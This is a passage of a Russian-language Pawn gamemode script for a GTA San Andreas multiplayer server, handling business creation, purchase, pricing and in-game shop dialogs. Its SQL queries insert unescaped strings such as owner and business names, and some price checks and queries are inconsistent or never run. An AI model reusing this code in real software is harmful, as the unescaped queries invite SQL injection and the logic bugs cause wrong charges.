			strmid(BizzInfo[TOTALBIZZ][bOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
			strmid(BizzInfo[TOTALBIZZ][bName], name, 0, strlen(name), MAX_PLAYER_NAME);
			BizzInfo[TOTALBIZZ][bVirtual] = TOTALBIZZ;
			BizzInfo[TOTALBIZZ][bPrice] = price;
			BizzInfo[TOTALBIZZ][bEnter] = 100;
			BizzInfo[TOTALBIZZ][bProduct] = 100000;
			BizzInfo[TOTALBIZZ][bTill] = 50;
			/*if(BizzInfo[TOTALBIZZ][bType] > 2) НЕДАВНО УБРАНО*/
			BizzInfo[TOTALBIZZ][bIcon] = CreateDynamicMapIcon(BizzInfo[TOTALBIZZ][bEntrx],BizzInfo[TOTALBIZZ][bEntry],BizzInfo[TOTALBIZZ][bEntrz], BizzInfo[TOTALBIZZ][bMIcon], 0,-1,-1,-1,200.0);
			if(BizzInfo[TOTALBIZZ][bType] != 2 && BizzInfo[TOTALBIZZ][bType] != 7)
			{
				BizzInfo[TOTALBIZZ][bPickup] = CreatePickup(19132,1, BizzInfo[TOTALBIZZ][bEntrx],BizzInfo[TOTALBIZZ][bEntry],BizzInfo[TOTALBIZZ][bEntrz]);
				BizzInfo[TOTALBIZZ][bPickupExit] = Create3DTextLabel("Для выхода введите '/exit'",0x33CCFFFF,BizzInfo[TOTALBIZZ][bExitx], BizzInfo[TOTALBIZZ][bExity], BizzInfo[TOTALBIZZ][bExitz],20.0,BizzInfo[TOTALBIZZ][bVirtual],1);
				BizzInfo[TOTALBIZZ][bMenu] = CreateDynamicCP(BizzInfo[TOTALBIZZ][bMenux],BizzInfo[TOTALBIZZ][bMenuy],BizzInfo[TOTALBIZZ][bMenuz], 1.0,BizzInfo[TOTALBIZZ][bVirtual],BizzInfo[TOTALBIZZ][bInt]);
				if(!strcmp(BizzInfo[TOTALBIZZ][bOwner],"None",true))
				{
					format(string, 90, "Бизнес продается!\nНазвание: %s", BizzInfo[TOTALBIZZ][bName]);
					LABELBIZZ[TOTALBIZZ] = Create3DTextLabel(string,COLOR_GREEN,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz],20.0,0,1);
				}
				else
				{
					format(string, 90, "Владелец: %s\nНазвание: %s", BizzInfo[TOTALBIZZ][bOwner], BizzInfo[TOTALBIZZ][bName]);
					LABELBIZZ[TOTALBIZZ] = Create3DTextLabel(string,COLOR_GREEN,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz],20.0,0,1);
				}
			}
			else if(BizzInfo[TOTALBIZZ][bType] == 2)
			{
				if(!strcmp(BizzInfo[TOTALBIZZ][bOwner],"None",true))
				{
					format(string, 90, "Заправка продается!\nНазвание: %s\nЦена за 1 литр - %i долларов", BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bTill] / 3);
					LABELBIZZ[TOTALBIZZ] = Create3DTextLabel(string,COLOR_GREEN,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz],20.0,0,1);
				}
				else
				{
					format(string, 90, "Владелец заправки: %s\nНазвание: %s\nЦена за 1 литр - %i долларов",  BizzInfo[TOTALBIZZ][bOwner], BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bTill] / 3);
					LABELBIZZ[TOTALBIZZ] = Create3DTextLabel(string,COLOR_GREEN,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz],20.0,0,1);
				}
			}
			else if(BizzInfo[TOTALBIZZ][bType] == 7)
			{
				if(!strcmp(BizzInfo[TOTALBIZZ][bOwner],"None",true))
				{
					format(string, 128, "CTO продается!\nНазвание: %s\nЦена за 1 запчасть - %i долларов\nЧто бы тюниться, введите /tuning", BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bTill]);
					LABELBIZZ[TOTALBIZZ] = Create3DTextLabel(string,COLOR_GREEN,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz],20.0,0,1);
				}
				else
				{
					format(string, 128, "Владелец СТО: %s\nНазвание: %s\nЦена за 1 запчасть - %i долларов\nЧто бы тюниться, введите /tuning",  BizzInfo[TOTALBIZZ][bOwner], BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bTill]);
					LABELBIZZ[TOTALBIZZ] = Create3DTextLabel(string,COLOR_GREEN,BizzInfo[TOTALBIZZ][bEntrx], BizzInfo[TOTALBIZZ][bEntry], BizzInfo[TOTALBIZZ][bEntrz],20.0,0,1);
				}
			}
			format(totalstring, sizeof(totalstring), "INSERT INTO "TABLE_BIZZ" (id, x, y, z, xt, yt, zt,menux,menuy,menuz, vint, virt, owner, name, price, type, icon) VALUES (%i, '%f', '%f', '%f', '%f', '%f', '%f','%f', '%f', '%f',%i, %i, '%s', '%s', %i, %i, %i)",
			TOTALBIZZ,BizzInfo[TOTALBIZZ][bEntrx],BizzInfo[TOTALBIZZ][bEntry],BizzInfo[TOTALBIZZ][bEntrz],BizzInfo[TOTALBIZZ][bExitx],BizzInfo[TOTALBIZZ][bExity],BizzInfo[TOTALBIZZ][bExitz], BizzInfo[TOTALBIZZ][bMenux],BizzInfo[TOTALBIZZ][bMenuy],BizzInfo[TOTALBIZZ][bMenuz]
			,BizzInfo[TOTALBIZZ][bInt],BizzInfo[TOTALBIZZ][bVirtual],BizzInfo[TOTALBIZZ][bOwner],BizzInfo[TOTALBIZZ][bName], BizzInfo[TOTALBIZZ][bPrice], BizzInfo[TOTALBIZZ][bType],BizzInfo[TOTALBIZZ][bMIcon]);
			mysql_query(totalstring);
			return SendMes(playerid,COLOR_ORANGE,"Бизнес номер %d создан",TOTALBIZZ);
		}
	case D_HEAL+7:
		{
			if(!response) return true;
			new idx = GetPVarInt(playerid, "PlayerBizz");
			if(!strcmp(BizzInfo[idx][bOwner],"None",true))
			{
				if(PlayerInfo[playerid][pBank] < GetInflationPrice(BizzInfo[idx][bPrice])) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney);
				else
				{
					new house = 0;
					for(new i = 1; i <= TOTALBIZZ;i++)
					{
						if(!strcmp(BizzInfo[i][bOwner],PlayerInfo[playerid][pSendername],true)) house++;
					}
					if(house != 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже владеете бизнесом!");
					PlayerInfo[playerid][pBank] -= GetInflationPrice(BizzInfo[idx][bPrice]);
					BizzInfo[idx][bBuyPrice] = GetInflationPrice(BizzInfo[idx][bPrice]);
					Exchequer+=GetInflationPrice(BizzInfo[idx][bPrice]);
					format(query, 256, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
					GameTextForPlayer(playerid, "The busines was bought", 3000, 5);
					SendMes(playerid, COLOR_WHITE, "Вы купили бизнес за %i долларов. Остаток на счете: %i долларов",GetInflationPrice(BizzInfo[idx][bPrice]), PlayerInfo[playerid][pBank]);
					SendClientMessage(playerid, COLOR_LIGHTRED, "Внимание! Не забывайте пополнять счет бизнеса");
					strmid(BizzInfo[idx][bOwner],PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
					format(query, sizeof(query), "UPDATE "TABLE_BIZZ" SET owner = '%s', buyprice = %i WHERE id = '%d' LIMIT 1", BizzInfo[idx][bOwner], BizzInfo[idx][bBuyPrice], idx);
					mysql_query(query);
					UpdateBizz(idx);
				}
			}
			else SendClientMessage(playerid, COLOR_GREY, "Ошибка! Действие невозможно!");
		}
	case D_HEAL+8:
		{
			if(!response) return true;
			new idx = GetPVarInt(playerid, "PlayerBizz");
			SetPlayerPos(playerid,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz]);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
		}
	case D_HEAL+9:
		{
			if(!response) return true;
			new idx = GetPVarInt(playerid, "PlayerBizz");
			SetPlayerPos(playerid,BizzInfo[idx][bExitx], BizzInfo[idx][bExity], BizzInfo[idx][bExitz]);
			SetPlayerInterior(playerid,BizzInfo[idx][bInt]);
			SetPlayerVirtualWorld(playerid,BizzInfo[idx][bVirtual]);
		}
	case D_HEAL+10:
		{
			if(!response) return true;
			new i = GetPVarInt(playerid, "PlayerBizz");
			switch(listitem)
			{
			case 0: BizzStats(playerid, i);
			case 1:
				{
					if(BizzInfo[i][bLock] == 0) return SendClientMessage(playerid, COLOR_GREY, "Бизнес уже открыт!");
					if(BizzInfo[i][bProduct] <= 0 || BizzInfo[i][bLic] == 0) return SendClientMessage(playerid, COLOR_GREY, "В бизнесе нет продуктов или нет лицензии!");
					BizzInfo[i][bLock] = 0;
					BizzInfo[i][bLockTime] = 0;
					SetBizzInt(i, "block", BizzInfo[i][bLock]);
					SetBizzInt(i, "locktime", BizzInfo[i][bLockTime]);
					SendClientMessage(playerid, COLOR_LIGHTRED, "Вы открыли бизнес. Всегда следите за состоянием продуктов и лицензией");
					SendClientMessage(playerid, COLOR_LIGHTRED, "В противном случае вы можете потерять бизнес");
				}
			case 2: ShowPlayerDialog(playerid, D_HEAL+11, 1, "Цена", "Введите цену за товар:", "Принять", "Отмена");
			case 3:
				{
					if(BizzInfo[i][bType] == 3 || BizzInfo[i][bType] == 4) ShowPlayerDialog(playerid, D_HEAL+12, 1, "Цена", "Введите цену за вход в долларах:", "Принять", "Отмена");
					else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
				}
			case 4: ShowPlayerDialog(playerid, D_HEAL+16, 0, "Продать бизнес", "{ffffff}Вы хотите продать свой бизнес?\n\n{FF6347}Внимание! Вам вернут только половину стоимости бизнеса!", "Да", "Нет");
			}
		}
	case D_HEAL+11:
		{
			if(!response) return true;
			new price, i = GetPVarInt(playerid, "PlayerBizz");
			if(sscanf(inputtext, "i",price)) ShowPlayerDialog(playerid, D_HEAL+11, 1, "Цена", "Введите цену за товар:", "Принять", "Отмена");
			if(price < 1 || price > 2000) return ShowPlayerDialog(playerid, D_HEAL+11, 1, "Цена", "Введите цену за товар:", "Принять", "Отмена");
			BizzInfo[i][bTill] = price;
			SetBizzInt(i, "till", price);
			SendMes(playerid, COLOR_BLUE, "Вы установили цену за 1 еденицу: %i", price);
			return true;
		}
	case D_HEAL+12:
		{
			if(!response) return true;
			new price, i = GetPVarInt(playerid, "PlayerBizz");
			if(sscanf(inputtext, "i",price)) ShowPlayerDialog(playerid, D_HEAL+12, 1, "Цена", "Введите цену за вход в долларах:", "Принять", "Отмена");
			if(price < 0 || price > 5000) return ShowPlayerDialog(playerid, D_HEAL+12, 1, "Цена", "Введите цену за вход в долларах:", "Принять", "Отмена");
			BizzInfo[i][bEnter] = price;
			SetBizzInt(i, "enter", price);
			SendMes(playerid, COLOR_BLUE, "Вы установили цену за вход: %i", price);
			return true;
		}
	case 1374:
		{
			if(!response) return true;
			if(PlayerInfo[playerid][pLevel] <= 1) return SendClientMessage(playerid,COLOR_YELLOW,"Покупка, продажа, использование оружие будет доступно со 2 уровня!");
			new i = GetPVarInt(playerid, "PlayerBizz"),till = BizzInfo[i][bTill];
			switch(listitem)
			{
			case 0:
				{
					if(GetMoney(playerid) < till*5) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*5);
					BizzInfo[i][bMoney] += till*5;
					BizzPay[i] += till*5;
					BizzInfo[i][bProduct] -= 5;
					SetArmour(playerid, 100);
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили Бронежилет");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					GunShopList(playerid, i);
				}
			case 1:
				{
					if(GetMoney(playerid) < till*3) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*3);
					BizzInfo[i][bMoney] += till*3;
					BizzPay[i] += till*3;
					BizzInfo[i][bProduct] -= 3;
					GiveWeapon(playerid, 4, 1);
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили Нож");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					GunShopList(playerid, i);
				}
			case 2:
				{
					if(GetMoney(playerid) < till*10) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*10);
					BizzInfo[i][bMoney] += till*10;
					BizzPay[i] += till*10;
					BizzInfo[i][bProduct] -= 10;
					GiveWeapon(playerid, 23, 50);
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили SDPistol, в комплекте дали 50 патронов");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					GunShopList(playerid, i);
				}
			case 3:
				{
					if(GetMoney(playerid) < till*15) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*15);
					BizzInfo[i][bMoney] += till*15;
					BizzPay[i] += till*15;
					BizzInfo[i][bProduct] -= 15;
					GiveWeapon(playerid, 24, 30);
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили Desert Eagle, в комплекте дали 30 патронов");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					GunShopList(playerid, i);
				}
			case 4:
				{
					if(GetMoney(playerid) < till*14) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*14);
					BizzInfo[i][bMoney] += till*14;
					BizzPay[i] += till*14;
					BizzInfo[i][bProduct] -= 14;
					GiveWeapon(playerid, 25, 30);
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили Shotgun, в комплекте дали 30 патронов");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					GunShopList(playerid, i);
				}
			case 5:
				{
					if(GetMoney(playerid) < till*23) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*23);
					BizzInfo[i][bMoney] += till*23;
					BizzPay[i] += till*23;
					BizzInfo[i][bProduct] -= 23;
					GiveWeapon(playerid, 31, 100);
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили m4, в комплекте дали 100 патронов");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					GunShopList(playerid, i);
				}
			case 6:
				{
					if(GetMoney(playerid) < till*20) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*20);
					BizzInfo[i][bMoney] += till*20;
					BizzPay[i] += till*20;
					BizzInfo[i][bProduct] -= 20;
					GiveWeapon(playerid, 29, 100);
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили MP5, в комплекте дали 100 патронов");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					GunShopList(playerid, i);
				}
			}
		}

	case D_HEAL+13:
		{
			if(!response) return true;
			new i = GetPVarInt(playerid, "PlayerBizz"),till = BizzInfo[i][bTill];
			switch(listitem)
			{
			case 0:
				{
					if(PlayerInfo[playerid][pPhone][0] == 1) return SendClientMessage(playerid, COLOR_GREY, "У вас уже есть мобильный телефон!");
					if(GetMoney(playerid) < till*5) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*5);
					BizzInfo[i][bMoney] += till*5;
					BizzPay[i] += till*5;
					BizzInfo[i][bProduct] -= 5;
					new randphone = 10000 + random(899999);
					PlayerInfo[playerid][pPhone][0] = 1;
					PlayerInfo[playerid][pPhone][1] = randphone;
					SendMes(playerid, COLOR_BLUE, "Вы купили мобильный телефон, вам подарили номер: %i", randphone);
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					MagazineList(playerid, i);
				}
			case 1:
				{
					if(PlayerInfo[playerid][pPhone][0] == 0) return SendClientMessage(playerid, COLOR_GREY, "У вас нет мобильного телефона!");
					if(GetMoney(playerid) < till*1) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*1);
					BizzInfo[i][bMoney] += till*1;
					BizzPay[i] += till*1;
					BizzInfo[i][bProduct] -= 1;
					new randphone;
					if(PlayerInfo[playerid][pVIP] ==  false) randphone = 10000 + random(899999);
					else randphone = 1000+random(8999);
					PlayerInfo[playerid][pPhone][1] = randphone;
					SendMes(playerid, COLOR_BLUE, "Вы купили новый номер телефона: %i", randphone);
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					MagazineList(playerid, i);
				}
			case 2:
				{
					if(PlayerInfo[playerid][pPhone][2] == 1) return SendClientMessage(playerid, COLOR_GREY, "У вас есть телефонная книга!");
					if(GetMoney(playerid) < till*3) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*3);
					BizzInfo[i][bMoney] += till*3;
					BizzPay[i] += till*3;
					BizzInfo[i][bProduct] -= 3;
					PlayerInfo[playerid][pPhone][2] = 1;
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили телефонную книгу. Новые доступные команды: /phone");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					MagazineList(playerid, i);
				}
			case 3:
				{
					if(GetMoney(playerid) < till*10) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					if(PlayerInfo[playerid][pLottery] > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже имеете лотерейный билет!");
					GiveMoney(playerid, -till*10);
					BizzInfo[i][bMoney] += till*10;
					BizzPay[i] += till*10;
					BizzInfo[i][bProduct] -= 10;
					new randnumber = random(1000);
					SendMes(playerid, COLOR_BLUE, "Вы купили лотерейный билет под номером %i, выигрышный номер: 777", randnumber);
					if(randnumber == 777)
					{
						SendClientMessage(playerid, COLOR_YELLOW, "Поздравляем! Вы выиграли в лотерее 100000$");
						GiveMoney(playerid,100000);
					}
					else SendClientMessage(playerid, COLOR_GREY, "Возможно вам повезет в следующий раз.");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					MagazineList(playerid, i);
				}
			case 4:
				{
					if(PlayerInfo[playerid][pLevel] <= 1) return SendClientMessage(playerid,COLOR_YELLOW,"Покупка фотоаппарата будет доступна со 2 уровня!");
					if(GetMoney(playerid) < till*2) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*2);
					BizzInfo[i][bMoney] += till*2;
					BizzPay[i] += till*2;
					BizzInfo[i][bProduct] -= 2;
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили фотоаппарат");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					GiveWeapon(playerid, 43, 30);
					MagazineList(playerid, i);
				}
			case 5:
				{
					if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете домом!");
					if(GetMoney(playerid) < till*8) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					new p = GetPVarInt(playerid, "PlayerHouse");
					GiveMoney(playerid, -till*5);
					BizzInfo[i][bMoney] += till*5;
					BizzInfo[i][bProduct] -= 5;
					BizzPay[i] += till*5;
					HouseInfo[p][hHeal] += 10;
					SetHouseInt(p, "hHeal", HouseInfo[p][hHeal]);
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили 10 аптечек для вашего дома");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					MagazineList(playerid, i);
				}
			case 6:
				{
					if(PlayerInfo[playerid][pLevel] <= 1) return SendClientMessage(playerid,COLOR_YELLOW,"Покупать цветы можно со 2 уровня!");
					if(GetMoney(playerid) < till*1) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*1);
					BizzInfo[i][bMoney] += till*1;
					BizzInfo[i][bProduct] -= 1;
					BizzPay[i] += till*1;
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили цветы");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					GiveWeapon(playerid, 14, 1);
					MagazineList(playerid, i);
				}
			case 7:
				{
					if(GetMoney(playerid) < till*4) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*4);
					BizzInfo[i][bMoney] += till*4;
					BizzInfo[i][bProduct] -= 4;
					BizzPay[i] += till*4;
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили часы, используйте /time");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					PlayerInfo[playerid][pWatch] = 1;
					MagazineList(playerid, i);
				}
			case 8:
				{
					if(GetMoney(playerid) < till*30) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*30);
					BizzInfo[i][bMoney] += till*30;
					BizzInfo[i][bProduct] -= 30;
					BizzPay[i] += till*30;
					SendClientMessage(playerid, COLOR_BLUE, "Вы купили маску, используйте /maskon /maskoff (убирает ваше отображение на радаре)");
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					PlayerInfo[playerid][pMask] = 1;
					MagazineList(playerid, i);
				}
			case 9:
				{
					if(GetMoney(playerid) < till*6) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*6);
					BizzInfo[i][bMoney] += till*6;
					BizzInfo[i][bProduct] -= 6;
					BizzPay[i] += till*6;
					PlayerInfo[playerid][pCiggare]++;
					SendMes(playerid, COLOR_BLUE, "Вы купили 1 сигару, теперь у вас %d сигар. Используйте /smoke (+7hp)",PlayerInfo[playerid][pCiggare]);
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					MagazineList(playerid, i);
				}
			case 10:
				{
					if(GetMoney(playerid) < till*5) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*5);
					BizzInfo[i][bMoney] += till*5;
					BizzInfo[i][bProduct] -= 5;
					BizzPay[i] += till*5;
					PlayerInfo[playerid][pSprunk]++;
					SendMes(playerid, COLOR_BLUE, "Вы купили 1 банку лимонада 'Sprunk', теперь у вас %d банки(ок) в рюкзаке. Используйте /sprunk (+5hp)",PlayerInfo[playerid][pSprunk]);
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					MagazineList(playerid, i);
				}
			}
		}
	case D_HEAL+14:
		{
			if(!response) return true;
			new i = GetPVarInt(playerid, "PlayerBizz"),till = BizzInfo[i][bTill], inter = GetPlayerInterior(playerid),Float:health;
			GetPlayerHealth(playerid,health);
			switch(listitem)
			{
			case 0:
				{
					if(GetMoney(playerid) < till*4) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*4);
					BizzInfo[i][bMoney] += till*4;
					BizzInfo[i][bProduct] -= 4;
					BizzPay[i] += till*4;
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					if(health < 100) SetHealth(playerid, health+10.0);
					if(inter == 5) format(string, 90, "%s съел(а) маленькую пиццу",PlayerInfo[playerid][pSendername]);
					if(inter == 10) format(string, 90, "%s съел(а) бургер",PlayerInfo[playerid][pSendername]);
					if(inter == 9) format(string, 90, "%s съел(а) кусочки пиццы",PlayerInfo[playerid][pSendername]);
					ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
					PlayerPlaySound(playerid, 32200, 0.0, 0.0, 0.0);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.0, 0, 0, 0, 0, 0,1);
					if(PlayerInfo[playerid][pSatiety]+10 > 100)
					{
						PlayerInfo[playerid][pSatiety] = 100;
						SendClientMessage(playerid,COLOR_WHITE,"Вы полностью наелись!");
					}
					else
					{
						PlayerInfo[playerid][pSatiety] += 10;
						SendMes(playerid,COLOR_YELLOW,"Ваша сытость повышена до %d",PlayerInfo[playerid][pSatiety]);
					}
					EatList(playerid, i);
				}
			case 1:
				{
					if(GetMoney(playerid) < till*7) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*7);
					BizzInfo[i][bMoney] += till*7;
					BizzInfo[i][bProduct] -= 7;
					BizzPay[i] += till*7;
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					if(health < 100) SetHealth(playerid, health+20.0);
					if(inter == 5) format(string, 90, "%s съел(а) среднюю пиццу",PlayerInfo[playerid][pSendername]);
					if(inter == 10) format(string, 90, "%s съел(а) большой бургер",PlayerInfo[playerid][pSendername]);
					if(inter == 9) format(string, 90, "%s съел(а) кусок куринной ножки",PlayerInfo[playerid][pSendername]);
					PlayerPlaySound(playerid, 32200, 0.0, 0.0, 0.0);
					ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
					if(PlayerInfo[playerid][pSatiety]+20 > 100)
					{
						PlayerInfo[playerid][pSatiety] = 100;
						SendClientMessage(playerid,COLOR_WHITE,"Вы полностью наелись!");
					}
					else
					{
						PlayerInfo[playerid][pSatiety] += 20;
						SendMes(playerid,COLOR_YELLOW,"Ваша сытость повышена до %d",PlayerInfo[playerid][pSatiety]);
					}
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.0, 0, 0, 0, 0, 0,1);
					EatList(playerid, i);
				}
			case 2:
				{
					if(GetMoney(playerid) < till*10) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*10);
					BizzInfo[i][bMoney] += till*10;
					BizzInfo[i][bProduct] -= 10;
					BizzPay[i] += till*10;
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					if(health < 100) SetHealth(playerid, health+40.0);
					if(inter == 5) format(string, 90, "%s съел(а) большую пиццу",PlayerInfo[playerid][pSendername]);
					if(inter == 10) format(string, 90, "%s съел(а) гамбургер",PlayerInfo[playerid][pSendername]);
					if(inter == 9) format(string, 90, "%s съел(а) куриную ножку",PlayerInfo[playerid][pSendername]);
					PlayerPlaySound(playerid, 32200, 0.0, 0.0, 0.0);
					ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
					ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.0, 0, 0, 0, 0, 0,1);
					if(PlayerInfo[playerid][pSatiety]+40 > 100)
					{
						PlayerInfo[playerid][pSatiety] = 100;
						SendClientMessage(playerid,COLOR_WHITE,"Вы полностью наелись!");
					}
					else
					{
						PlayerInfo[playerid][pSatiety] += 40;
						SendMes(playerid,COLOR_YELLOW,"Ваша сытость повышена до %d",PlayerInfo[playerid][pSatiety]);
					}
					EatList(playerid, i);
				}
			}
			GetPlayerHealth(playerid,health);
			if(health > 100) SetHealth(playerid, 100.0);
		}
	case D_HEAL+15:
		{
			if(!response) return true;
			new i = GetPVarInt(playerid, "PlayerBizz"),till = BizzInfo[i][bTill],Float:health;
			GetPlayerHealth(playerid,health);
			switch(listitem)
			{
			case 0:
				{
					if(GetMoney(playerid) < till*4) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*4);
					BizzInfo[i][bMoney] += till*4;
					BizzPay[i] += till*4;
					BizzInfo[i][bProduct] -= 4;
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					format(string, 90, "%s выпил(а) воды",PlayerInfo[playerid][pSendername]);
					ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
					SetHealth(playerid, health+10.0);
					ApplyAnimation(playerid,"BAR","dnk_stndF_loop",4.1,0,0,0,0,0,1);
					ClubList(playerid, i);
				}
			case 1:
				{
					if(GetMoney(playerid) < till*7) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*7);
					BizzInfo[i][bMoney] += till*7;
					BizzInfo[i][bProduct] -= 7;
					BizzPay[i] += till*7;
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					SetHealth(playerid, health+10.0);
					format(string, 90, "%s выпил(а) соды",PlayerInfo[playerid][pSendername]);
					ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
					ApplyAnimation(playerid,"BAR","dnk_stndF_loop",4.1,0,0,0,0,0,1);
					ClubList(playerid, i);
				}
			case 2:
				{
					if(GetMoney(playerid) < till*10) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
					GiveMoney(playerid, -till*10);
					BizzInfo[i][bMoney] += till*10;
					BizzInfo[i][bProduct] -= 10;
					BizzPay[i] += till*10;
					SetBizzInt(i, "money", BizzInfo[i][bMoney]);
					SetBizzInt(i, "product", BizzInfo[i][bProduct]);
					SetHealth(playerid, health+10.0);
					format(string, 90, "%s выпил(а) кока-колы",PlayerInfo[playerid][pSendername]);
